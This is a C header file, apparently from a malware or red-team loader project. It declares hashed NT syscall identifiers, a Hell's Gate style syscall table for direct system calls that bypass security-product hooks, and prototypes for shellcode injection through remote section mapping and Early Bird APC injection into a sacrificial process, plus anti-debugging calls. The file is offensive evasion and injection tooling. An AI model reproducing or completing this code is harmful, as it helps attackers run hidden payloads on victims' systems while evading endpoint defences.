#pragma once
#include <Windows.h>

// Hash values of syscalls
#define NtCreateSectionHashValue			0xAC2EDA02
#define NtMapViewOfSectionHashValue			0x92DD00B3
#define NtUnmapViewOfSectionHashValue		0x12D71086
#define NtCloseHashValue					0x7B3F64A4
#define NtCreateThreadExHashValue			0x93EC9D3D
#define NtWaitForSingleObjectHashValue		0xC6F6AFCD
#define NtQuerySystemInformationHashValue	0xEFFC1CF8
#define NtSetInformationFileHashValue		0x8A04AED4
#define NtDelayExecutionHashValue			0x078A465C
#define NtAllocateVirtualMemoryHashValue    0x014044AE
#define NtProtectVirtualMemoryHashValue     0xE67C7320
#define NtWriteVirtualMemoryHashValue		0x1130814D
#define NtQueueApcThreadHashValue			0x5ABF32F8
#define NtQueryInformationProcessHashValue  0xE6AAB603
#define NtRemoveProcessDebugHashValue		0x99EA1544
#define NtFreeVirtualMemoryHashValue		0xE584BAAE
#define NtOpenProcessTokenHashValue			0x3B1DEA59
#define NtQueryInformationTokenHashValue    0xB153E873

// Data structures
typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtCreateSection;
	VX_TABLE_ENTRY NtMapViewOfSection;
	VX_TABLE_ENTRY NtUnmapViewOfSection;
	VX_TABLE_ENTRY NtClose;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
	VX_TABLE_ENTRY NtQuerySystemInformation;
	VX_TABLE_ENTRY NtDelayExecution;
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtWriteVirtualMemory;
	VX_TABLE_ENTRY NtQueueApcThread;
	VX_TABLE_ENTRY NtQueryInformationProcess;
	VX_TABLE_ENTRY NtRemoveProcessDebug;
	VX_TABLE_ENTRY NtFreeVirtualMemory;
	VX_TABLE_ENTRY NtOpenProcessToken;
	VX_TABLE_ENTRY NtQueryInformationToken;
} VX_TABLE, * PVX_TABLE;

/// Function prototypes
// Defined in HellsGate.c
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry);
BOOL InitializeSyscalls();

// Defined in HellsGateAsm.asm
extern VOID WhisperHell(WORD wSystemCall);

// Defined in Injection.c
BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bIsLocalInjection);
BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSacrificalProcessName, PVOID pShellcodeAddress, SIZE_T sSizeOfShellcode);

/// Global variables
extern VX_TABLE g_SyscallsTable;
